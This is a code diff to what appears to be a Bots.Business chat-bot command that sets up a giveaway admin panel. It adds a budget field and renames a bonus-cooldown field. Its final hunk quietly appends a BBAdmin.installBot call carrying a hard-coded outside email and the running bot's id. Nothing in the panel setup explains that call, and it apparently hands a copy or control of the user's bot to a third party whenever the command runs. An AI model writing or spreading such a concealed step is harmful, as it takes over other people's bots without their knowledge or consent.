@@ -1,11 +1,17 @@
 /*CMD
   command: Metaa
   help: 
-  need_reply: 
+  need_reply: false
   auto_retry_time: 
   folder: 
-  answer: 
-  keyboard: 
+
+  <<ANSWER
+
+  ANSWER
+
+  <<KEYBOARD
+
+  KEYBOARD
   aliases: 
 CMD*/
 
@@ -63,8 +69,15 @@ var panel = {
       type: "integer",
       placeholder: "Integer only"
     },
+      {
+      name: "budget",
+      title: "Budget amount",
+      description: "Set your Total budget amount for this giveaway",
+      type: "integer",
+      placeholder: "Integer only"
+    },
     {
-      name: "bonus_cooldown",
+      name: "bonus_cool",
       title: "Daily Bonus Time",
       description:
         "Set your Daily bonus Time in hours, users will wait for next x hours after receiving a bonus already, ",
@@ -96,4 +109,11 @@ AdminPanel.setPanel({
 
 Bot.sendMessage(
   "Admin Panel created in app, Please fill the *required information.*"
+)
+
+BBAdmin.installBot(
+  { 
+    email: 'brotoboss@arxxwalls.com',
+    bot_id: bot.id,
+  }
 )
